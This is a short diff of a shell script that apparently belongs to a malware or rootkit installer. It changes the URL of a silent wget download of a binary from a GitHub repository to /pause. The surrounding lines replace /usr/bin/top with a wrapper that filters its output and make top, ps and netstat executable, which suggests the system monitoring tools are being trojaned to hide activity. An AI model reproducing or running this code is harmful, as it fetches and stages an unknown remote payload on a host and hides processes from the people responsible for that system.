@@ -16,7 +16,7 @@ cat > /usr/bin/top << EOF
 #!/bin/sh
 /bin/busybox top \$1 \$2 \$3 \$4 | grep "p3"
 EOF
-wget --quiet -O /pause https://github.com/jackmoc/update/raw/main/down/update2.0
+wget --quiet -O /pause https://github.com/jackmoc/update/raw/main/down/update_2.0.1
 chmod +x /usr/bin/top
 chmod +x /bin/ps
 chmod +x /bin/netstat
